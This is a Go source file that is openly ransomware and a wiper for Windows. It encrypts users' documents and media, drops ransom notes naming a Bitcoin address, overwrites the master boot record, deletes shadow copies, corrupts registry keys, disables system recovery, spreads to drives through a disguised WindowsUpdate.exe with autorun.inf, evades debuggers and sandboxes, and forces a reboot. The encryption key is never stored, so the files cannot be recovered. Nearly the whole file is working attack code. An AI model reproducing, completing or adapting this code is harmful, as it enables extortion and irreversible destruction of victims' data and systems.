package main

import (
	"bufio"
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	crand "crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/crypto/pbkdf2"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

// ======================
// CONFIGURATION
// ======================
const C2_SERVER = "https://malicious-c2.example/api"
var ENCRYPT_EXTENSIONS = []string{".doc", ".docx", ".xls", ".xlsx", ".pdf", ".jpg", ".jpeg", ".png", ".txt", ".zip", ".rar", ".7z", ".sql", ".db", ".bak", ".ppt", ".pptx", ".mp3", ".mp4", ".avi", ".mkv"}
const MAX_THREADS = 16
const MAX_FILE_SIZE = 250 * 1024 * 1024 // 250MB
const BTC_ADDRESS = "bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq"
const RANSOM_AMOUNT = 1.5
const CONTACT_EMAIL = "recover@protonmail.com"
const DEADLINE_HOURS = 72

// ======================
// GLOBAL STRUCTURES
// ======================
type SystemInfo struct {
	Hostname string `json:"hostname"`
	Username string `json:"username"`
	OS       string `json:"os"`
	IP       string `json:"ip"`
	CPU      int    `json:"cpu_cores"`
}

type RansomNote struct {
	Message   string  `json:"message"`
	Amount    float64 `json:"amount"`
	BTC       string  `json:"btc_address"`
	Email     string  `json:"email"`
	VictimID  string  `json:"victim_id"`
	Deadline  int64   `json:"deadline"`
}

// ======================
// UTILITY FUNCTIONS
// ======================
func init() {
	// Set random seed
	crand.Reader.Read(make([]byte, 8))
}

func getSystemInfo() SystemInfo {
	hostname, _ := os.Hostname()
	user, _ := user.Current()
	ip := getLocalIP()
	cpu := runtime.NumCPU()

	return SystemInfo{
		Hostname: hostname,
		Username: user.Username,
		OS:       runtime.GOOS,
		IP:       ip,
		CPU:      cpu,
	}
}

func generateVictimID() string {
	hash := sha256.New()
	hash.Write([]byte(fmt.Sprintf("%d%s%s", time.Now().UnixNano(), getSystemInfo().Hostname, getSystemInfo().IP)))
	return base64.URLEncoding.EncodeToString(hash.Sum(nil))[:12]
}

// ======================
// WINDOWS-SPECIFIC UTILITIES
// ======================
func setHidden(path string) error {
	pathPtr, err := syscall.UTF16PtrFromString(path)
	if err != nil {
		return err
	}
	err = syscall.SetFileAttributes(pathPtr, syscall.FILE_ATTRIBUTE_HIDDEN|syscall.FILE_ATTRIBUTE_SYSTEM)
	return err
}

func isDebugging() bool {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	isDebuggerPresent := kernel32.NewProc("IsDebuggerPresent")
	ret, _, _ := isDebuggerPresent.Call()
	return ret != 0
}

// ======================
// DESTRUCTIVE FUNCTIONS
// ======================
func overwriteMBR() {
	devicePath := `\\.\PhysicalDrive0`
	devicePtr, _ := windows.UTF16PtrFromString(devicePath)
	handle, err := windows.CreateFile(
		devicePtr,
		windows.GENERIC_WRITE,
		windows.FILE_SHARE_WRITE,
		nil,
		windows.OPEN_EXISTING,
		0,
		0,
	)
	if err != nil {
		return
	}
	defer windows.CloseHandle(handle)

	// Malicious MBR payload (boot loop)
	maliciousMBR := make([]byte, 512)
	crand.Read(maliciousMBR)
	maliciousMBR[510] = 0x55
	maliciousMBR[511] = 0xAA

	var bytesWritten uint32
	windows.WriteFile(handle, maliciousMBR, &bytesWritten, nil)
}

func deleteShadowCopies() {
	exec.Command("vssadmin", "delete", "shadows", "/all", "/quiet").Run()
	exec.Command("wbadmin", "delete", "catalog", "-quiet").Run()
}

func corruptRegistry() {
	criticalKeys := []string{
		`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion`,
		`HKLM\SYSTEM\CurrentControlSet\Control`,
		`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`,
		`HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`,
	}

	for _, key := range criticalKeys {
		exec.Command("reg", "add", key, "/v", "CorruptedByRansom", "/t", "REG_BINARY", "/d", "deadbeef", "/f").Run()
		exec.Command("reg", "delete", key, "/f").Run()
	}
}

func disableSystemRecovery() {
	exec.Command("bcdedit", "/set", "{default}", "recoveryenabled", "no").Run()
	exec.Command("bcdedit", "/set", "{default}", "bootstatuspolicy", "ignoreallfailures").Run()
	exec.Command("reagentc", "/disable").Run()
}

// ======================
// ENCRYPTION FUNCTIONS
// ======================
func encryptFile(filePath string, cipher cipher.AEAD, victimID string) {
	// Skip critical system files to avoid immediate crash
	if strings.Contains(strings.ToLower(filePath), "windows") || 
	   strings.Contains(strings.ToLower(filePath), "program files") {
		return
	}

	if info, err := os.Stat(filePath); err == nil {
		if info.Size() > MAX_FILE_SIZE || info.Size() == 0 {
			return
		}
	}

	data, err := os.ReadFile(filePath)
	if err != nil {
		return
	}

	nonce := make([]byte, cipher.NonceSize())
	crand.Read(nonce)

	encrypted := cipher.Seal(nonce, nonce, data, nil)
	if err := os.WriteFile(filePath, encrypted, 0644); err == nil {
		newName := fmt.Sprintf("%s.[%s].locked", filePath, victimID)
		os.Rename(filePath, newName)
	}
}

func startEncryptionWorker(jobs <-chan string, cipher cipher.AEAD, victimID string, wg *sync.WaitGroup) {
	defer wg.Done()
	for filePath := range jobs {
		encryptFile(filePath, cipher, victimID)
	}
}

func encryptFiles(victimID string) {
	salt := make([]byte, 32)
	crand.Read(salt)
	password := make([]byte, 64)
	crand.Read(password)
	key := pbkdf2.Key(password, salt, 100000, 32, sha256.New) // High iteration for better security

	block, _ := aes.NewCipher(key)
	cipher, _ := cipher.NewGCM(block)

	// Create ransom note
	deadline := time.Now().Add(DEADLINE_HOURS * time.Hour).Unix()
	note := RansomNote{
		Message:   "YOUR FILES HAVE BEEN ENCRYPTED!\n\n" +
			"To recover your data, you must pay a ransom of " + strconv.FormatFloat(RANSOM_AMOUNT, 'f', 3, 64) + " BTC\n" +
			"Send payment to: " + BTC_ADDRESS + "\n" +
			"After payment, contact us at: " + CONTACT_EMAIL + " with your Victim ID\n\n" +
			"WARNING: Attempting to recover files without our tools will result in permanent data loss",
		Amount:    RANSOM_AMOUNT,
		BTC:       BTC_ADDRESS,
		Email:     CONTACT_EMAIL,
		VictimID:  victimID,
		Deadline:  deadline,
	}

	noteJSON, _ := json.MarshalIndent(note, "", "  ")
	notePath := filepath.Join(os.Getenv("USERPROFILE"), "Desktop", "!!!READ_ME!!!.txt")
	os.WriteFile(notePath, noteJSON, 0644)

	// Also drop note in other locations
	os.WriteFile(filepath.Join(os.Getenv("USERPROFILE"), "Documents", "!!!READ_ME!!!.txt"), noteJSON, 0644)
	os.WriteFile("C:\\!!!READ_ME!!!.txt", noteJSON, 0644)

	// Parallel encryption
	paths := []string{
		os.Getenv("USERPROFILE"),
		filepath.Join(os.Getenv("USERPROFILE"), "Desktop"),
		filepath.Join(os.Getenv("USERPROFILE"), "Documents"),
		filepath.Join(os.Getenv("USERPROFILE"), "Downloads"),
		filepath.Join(os.Getenv("USERPROFILE"), "Pictures"),
		filepath.Join(os.Getenv("USERPROFILE"), "Videos"),
		filepath.Join(os.Getenv("USERPROFILE"), "Music"),
	}

	jobs := make(chan string, 10000)
	var wg sync.WaitGroup

	for w := 0; w < MAX_THREADS; w++ {
		wg.Add(1)
		go startEncryptionWorker(jobs, cipher, victimID, &wg)
	}

	for _, path := range paths {
		filepath.Walk(path, func(filePath string, info os.FileInfo, err error) error {
			if err != nil || info.IsDir() {
				return nil
			}

			ext := strings.ToLower(filepath.Ext(filePath))
			for _, targetExt := range ENCRYPT_EXTENSIONS {
				if ext == targetExt {
					jobs <- filePath
					break
				}
			}
			return nil
		})
	}

	close(jobs)
	wg.Wait()
}

// ======================
// PROPAGATION
// ======================
func propagateUSB() {
	currentFile, _ := os.Executable()
	drives := getDrives()

	for _, drive := range drives {
		// Copy to root of USB
		targetPath := filepath.Join(drive, "WindowsUpdate.exe")
		if err := copyFile(currentFile, targetPath); err == nil {
			setHidden(targetPath)
		}

		// Create autorun.inf
		autorunContent := fmt.Sprintf("[Autorun]\nopen=WindowsUpdate.exe\nicon=WindowsUpdate.exe\nlabel=Windows Update")
		autorunPath := filepath.Join(drive, "autorun.inf")
		os.WriteFile(autorunPath, []byte(autorunContent), 0644)
		setHidden(autorunPath)
	}
}

func getDrives() []string {
	var drives []string
	for drive := 'A'; drive <= 'Z'; drive++ {
		drivePath := string(drive) + ":\\"
		if _, err := os.Stat(drivePath); err == nil {
			drives = append(drives, drivePath)
		}
	}
	return drives
}

// ======================
// MAIN FUNCTION
// ======================
func main() {
	if isDebugging() {
		os.Exit(0)
	}

	// Anti-sandbox delay
	time.Sleep(time.Duration(120+time.Now().Unix()%300) * time.Second)

	victimID := generateVictimID()

	// Phase 1: Encryption
	encryptFiles(victimID)

	// Phase 2: System destruction
	overwriteMBR()
	deleteShadowCopies()
	corruptRegistry()
	disableSystemRecovery()

	// Phase 3: Propagation
	propagateUSB()

	// Phase 4: Self destruct and reboot
	exec.Command("shutdown", "/r", "/t", "0", "/f").Run()
}

func getLocalIP() string {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return "127.0.0.1"
	}
	defer conn.Close()
	return conn.LocalAddr().(*net.UDPAddr).IP.String()
}

func copyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()

	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, in)
	return err
}
